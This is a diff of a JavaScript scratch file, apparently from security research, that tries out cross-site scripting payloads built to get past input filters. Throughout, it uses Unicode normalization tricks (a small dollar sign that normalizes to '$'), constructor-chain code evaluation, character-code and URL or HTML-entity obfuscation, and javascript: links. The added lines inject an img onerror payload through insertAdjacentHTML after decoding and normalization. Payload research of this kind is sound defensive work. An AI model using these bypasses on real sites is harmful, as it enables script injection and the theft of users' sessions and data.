@@ -11,27 +11,27 @@ var abc = (...input) => {
 // eval.constructor('alert("eval")')();
 // isFinite.constructor('alert("isFinite")')();
 // Intl.DateTimeFormat.constructor.constructor('alert("object")')();
-console.log("\uFE69")
-console.log("﹩")
-console.log("﹩".normalize('NFKD'))
-console.log("\uFE69".normalize('NFKC'))
-console.log("eval(\"prompt`\u{FE69}{'normalized'}`\")".normalize('NFKD'))
+// console.log("\uFE69")
+// console.log("﹩")
+// console.log("﹩".normalize('NFKD'))
+// console.log("\uFE69".normalize('NFKC'))
+// console.log("eval(\"prompt`\u{FE69}{'normalized'}`\")".normalize('NFKD'))
 // eval("prompt`${'normalized'}`")
-console.log("alert\u{207D}'normalizeMe')".normalize('NFKD'))
-const secret = "very secret string"
-const incomingPayload = "a\");prompt`\u{FE69}{secret}`;(\""
-const message = "Hello " + incomingPayload.normalize('NFKD')
-const evaluateMe = "console.log(\"" + message + "\")"
-eval(evaluateMe)
-console.log(String.fromCharCode(0x4c, 105, 0x6e, 117, 120))
-console.log(String.fromCharCode(0x61, 108, 0x65, 114, 116, 0x28, 96, 120, 115, 115, 0x60, 0x29))
-console.log(String);
+// console.log("alert\u{207D}'normalizeMe')".normalize('NFKD'))
+// const secret = "very secret string"
+// const incomingPayload = "a\");prompt`\u{FE69}{secret}`;(\""
+// const message = "Hello " + incomingPayload.normalize('NFKD')
+// const evaluateMe = "console.log(\"" + message + "\")"
+// eval(evaluateMe)
+// console.log(String.fromCharCode(0x4c, 105, 0x6e, 117, 120))
+// console.log(String.fromCharCode(0x61, 108, 0x65, 114, 116, 0x28, 96, 120, 115, 115, 0x60, 0x29))
+// console.log(String);
 // eval(String.fromCharCode(0x61,108,0x65,114,116,0x28,96,120,115,115,0x60,0x29))
 // [].map.constructor('[].map.constructor(' + 'String.' + 'fromCharCode(0x61,108,0x65,114,116,0x28,96,120,116,115,0x60,0x29)' + ')();')()
-const b = 10
-console.log(b)
+// const b = 10
+// console.log(b)
 // console.log(eval('"1" + " 23"'))
-console.log(`t\est`);
+// console.log(`t\est`);
 // document.getElementById('div1').insertAdjacentHTML('afterbegin', '<img src=0 onerror=' + '"alert\u{0028}\'works\')"' + '/>')
 // [].constructor.constructor('alert' + '(`concatenation`)')()
 // []["constructor"]["constructor"]('alert' + '(`conaaaaacatenation`)')()
@@ -83,24 +83,44 @@ console.log(`t\est`);
 //
 // const input = JSON.parse("{\"body\":\"[]['constructor']['constructor'](`var\/**\/s\/**\/=\/**\/'secret';\/**\/promp`\/**\/+\/**\/`t(s,\/**\/s)`)()\"}");
 // const input = JSON.parse("{\"body\":\"[]['constructor']['constructor'](`var/**/s/**/=/**/'secret';/**/promp`/**/+/**/`t(s,/**/s)`)()\"}");
-const input = JSON.parse("{\"body\":\"%5Cu%7B0061%7Dlert%28%27escaaape%27%29\"}");
+// al\u{0065}rt('test')
+// const input2 = JSON.parse("{\"body\":\"alert%5Cu%7B0028%7D%27escaped%27%29\"}");
+// eval('alert' + '(`concatenation`)')
+// const b = 1;
+
+// prompt`a${'secret'}`
+// []['constructor']['constructor']`${'var s = "secret";promp' + 't`s${s}`'}```
+//
+
+// [][`constructor`][`constructor`]('pro'+'mpt`see4InInput${2+2}:`')();
+// [][`constructor`][`constructor`]('pro'+'mpt`see4InInput$'+[open+[]][0][16]+'2+2'+[open+[]][0][36]+':`')()
+//
+const secret="THISISASECRET"
+// prompt`${secret}`
+prompt(',',secret)
+
+const input = JSON.parse("{\"body\":\"[].map.constructor('prompt`﹩{secret}`'.normalize('NFKC'))()\"}");
 console.log(input.body)
 // console.log(decodeURIComponent('%5Cu%7B0061%7Dlert%28%27escape%27%29'))
 input.body = decodeURIComponent(input.body);
-// console.log(input.body)
+input.body = input.body.normalize('NFKC');
+// input2.body = decodeURIComponent(input2.body);
+console.log(input.body)
 document.getElementById('div1').insertAdjacentHTML('afterbegin', `<img src=1 onerror=${input.body}>`)
+// document.getElementById('div1').insertAdjacentHTML('afterbegin', `<img src=2 onerror=${input2.body}>`)
+// document.getElementById('div1').insertAdjacentHTML('afterbegin', `${input.body}>`)
 
 
 
 // eval('prompt`\u0024{111}`'.normalize('NFKC'))
 // var/**/s/**/=/**/5;/**/prompt(s,/**/s)
 
-assert(1)
+// assert(1)
 
 
-const input2 = JSON.parse("{\"body\":\"<a href=jav&#x61;script:alert&#x28;'aaa')>ClickMeFor$</a>\"}")
-console.log(input2.body)
-document.getElementById('div1').insertAdjacentHTML('afterbegin', input2.body)
+// const input2 = JSON.parse("{\"body\":\"<a href=jav&#x61;script:alert&#x28;'aaa')>ClickMeFor$</a>\"}")
+// console.log(input2.body)
+// document.getElementById('div1').insertAdjacentHTML('afterbegin', input2.body)
 // let input2 = JSON.parse("{\"body\":\"'alert'+'(222)'\"}")
 // input2 = JSON.parse("{\"body\":\"'alert' + '(`concatenation`)'\"}")
 // console.log(input2.body)
@@ -272,12 +292,12 @@ setTimeout(() => {
 	// eval("[]['constructor']['constructor']`a﹩{'var s = \"secret\";promp' + 't`something﹩{s}`'}```".normalize('NFKC'));
 	// alert`${1+1}`
 	// alert(["",""])
-	console.log("escaped: \x61");
+	// console.log("escaped: \x61");
 	// prompt`${1 + 1}`
-	console.log(["c", "a", "b"].toSorted());
+	// console.log(["c", "a", "b"].toSorted());
 
 	// alert(`${new Date()}`)
-	console.log("alert(`${new Date()}`");
+	// console.log("alert(`${new Date()}`");
 	// eval(
 	// 	decodeURIComponent(
 	// 		decodeURIComponent(
@@ -286,18 +306,18 @@ setTimeout(() => {
 	// 	),
 	// );
 	// [][`constructor`][`constructor`]`a${'al' + [open + []][0][11] + 'rt' + [open + []][0][13] + ['"'][0] + 'Oneconsult' + ['"'][0] + [open + []][0][14]}```;
-	console.log(
-		encodeURIComponent(
-			'[][`constructor`][`constructor`]`a\uFE69{`al`+[open+[]][0][11]+`rt`+[open+[]][0][13]+[`"`][0]+`Oneconsult`+[`"`][0]+[open+[]][0][14]}```',
-		),
-	);
-	console.log(encodeURIComponent('{ "body": "alert\\u0024{1}" }'));
-	console.log(encodeURIComponent("alert(`${new Date()}`)"));
-	console.log(encodeHTMLEntities("$"));
-	const a = replaceWithHTMLCharCode("<script>alert(22)</script>");
-	console.log(a);
-	console.log(decodeHTMLEntities(a));
-	console.log(JSON.parse('{ "body": "alert\\u0024{1}" }'));
+	// console.log(
+	// 	encodeURIComponent(
+	// 		'[][`constructor`][`constructor`]`a\uFE69{`al`+[open+[]][0][11]+`rt`+[open+[]][0][13]+[`"`][0]+`Oneconsult`+[`"`][0]+[open+[]][0][14]}```',
+	// 	),
+	// );
+	// console.log(encodeURIComponent('{ "body": "alert\\u0024{1}" }'));
+	// console.log(encodeURIComponent("alert(`${new Date()}`)"));
+	// console.log(encodeHTMLEntities("$"));
+	// const a = replaceWithHTMLCharCode("<script>alert(22)</script>");
+	// console.log(a);
+	// console.log(decodeHTMLEntities(a));
+	// console.log(JSON.parse('{ "body": "alert\\u0024{1}" }'));
 	// console.log(JSON.stringify(encodeURIComponent('\u0024{`alert`}')))
 	// console.log(encodeURIComponent('alert(`${new Date()}`)'))
 	// console.log(encodeURIComponent(encodeURIComponent('alert(`${new Date()}`)')))
